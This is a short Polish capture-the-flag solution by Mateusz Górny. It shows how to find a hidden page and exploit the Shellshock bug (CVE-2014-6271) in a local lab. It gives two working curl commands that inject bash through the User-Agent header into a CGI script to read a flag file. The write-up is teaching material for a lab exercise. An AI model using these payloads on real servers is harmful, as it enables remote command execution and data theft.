## Description

## Solution
Aby rozwiązać zadanie należy sprawdzić plik js, w którym ukryta jest nazwa strony. Po wejściu na nią można zobaczyć iframe, który pobiera ze skryptów wylistowane pliki przez bash. To może nakierować na:
CVE-2014-6271 (shellshock)
Aby znaleźć flagę należy wykonać kod:
```
curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'grep flag /flags/flag.*.txt;'" http://localhost:8080/cgi-bin/todo
```
Ta komenda zwróci `Binary file /flags/flag.048.txt matches` mówiący w jakim pliku jest flaga.
Następnie należy wykonać:
```
curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'tail -n1 flag /flags/flag.048.txt;'" http://localhost:8080/cgi-bin/todo
```

## Links
https://www.cert.pl/news/single/cve-2014-6271-shellshock-luka-powlokach-bash-sh-podobnych/
https://github.com/hmlio/vaas-cve-2014-6271
https://hub.docker.com/r/hmlio/vaas-cve-2014-6271

## Created by
Mateusz Górny